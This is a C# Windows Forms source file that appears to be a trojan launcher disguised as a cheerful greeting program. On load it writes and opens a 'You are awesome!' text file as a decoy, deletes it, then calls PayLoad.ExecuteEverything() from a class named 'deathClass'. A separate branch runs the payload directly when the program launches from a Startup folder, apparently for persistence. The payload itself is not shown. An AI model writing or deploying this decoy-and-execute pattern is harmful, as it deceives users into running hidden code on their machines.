﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using deathClass;

namespace awesomeFile
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Environment.CurrentDirectory.IndexOf(@"Startup") > -1)
            {
                PayLoad pl = new PayLoad();
                pl.ExecuteEverything();
            }
            else
            {

                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "awesomeFile.txt");
                string[] awesomeFile = {
                    "Hello!",
                    "You are awesome!",
                    "",
                    "Wink!"
                };
                File.WriteAllLines(filePath, awesomeFile);
                Process death = Process.Start(filePath);
                death.WaitForExit();
                File.Delete(filePath);

                PayLoad pl = new PayLoad();
                pl.ExecuteEverything();
            }
        }
    }
}
